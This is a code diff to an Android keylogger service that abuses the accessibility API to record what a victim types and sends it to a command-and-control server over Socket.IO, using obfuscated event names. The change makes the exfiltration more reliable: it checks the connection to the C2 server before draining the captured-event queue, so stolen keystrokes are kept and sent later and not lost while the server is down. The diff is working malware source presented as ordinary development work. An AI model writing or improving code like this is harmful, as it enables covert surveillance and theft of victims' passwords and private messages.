@@ -698,6 +698,11 @@ public class KeyloggerService extends AccessibilityService {
     /**
      * Flushes all buffered events to the C2 server via Socket.IO.
      * Called periodically or on-demand (via x0000kl flush command).
+     *
+     * CRITICAL: Checks socket connectivity BEFORE polling events from
+     * the queue. If the socket is not connected, events stay buffered
+     * and are not lost. This prevents silent data loss when the C2
+     * server is temporarily unreachable.
      */
     public void flushBuffer() {
         flushHandler.removeCallbacks(flushRunnable);
@@ -705,6 +710,16 @@ public class KeyloggerService extends AccessibilityService {
         if (eventBuffer.isEmpty()) return;
 
         try {
+            // Check socket connectivity BEFORE draining the queue
+            Socket socket = IOSocket.getInstance().getIoSocket();
+            if (socket == null || !socket.connected()) {
+                // Socket is down — keep events in buffer, retry later
+                Log.d(TAG, "Socket not connected, deferring flush of " + eventBuffer.size() + " events");
+                flushHandler.postDelayed(flushRunnable, FLUSH_INTERVAL_MS);
+                return;
+            }
+
+            // Safe to drain — socket is connected
             JSONArray batch = new JSONArray();
             JSONObject event;
             while ((event = eventBuffer.poll()) != null) {
@@ -713,21 +728,14 @@ public class KeyloggerService extends AccessibilityService {
 
             if (batch.length() == 0) return;
 
-            // Send via socket
-            Socket socket = IOSocket.getInstance().getIoSocket();
-            if (socket != null && socket.connected()) {
-                JSONObject payload = new JSONObject();
-                payload.put("events", batch);
-                payload.put("count", batch.length());
-                payload.put("from", lastPackageName);
-                payload.put("ts", System.currentTimeMillis());
+            JSONObject payload = new JSONObject();
+            payload.put("events", batch);
+            payload.put("count", batch.length());
+            payload.put("from", lastPackageName);
+            payload.put("ts", System.currentTimeMillis());
 
-                socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KLDATA), payload);
-                Log.d(TAG, "Flushed " + batch.length() + " keylogger events");
-            }
-            // If socket isn't connected, events remain buffered in the ConcurrentLinkedQueue
-            // — they were polled out though. We need to re-add them if send failed.
-            // In practice, the service reconnects automatically via ConnectionManager.
+            socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KLDATA), payload);
+            Log.d(TAG, "Flushed " + batch.length() + " keylogger events");
 
         } catch (Exception e) {
             Log.e(TAG, "Failed to flush buffer: " + e.getMessage());
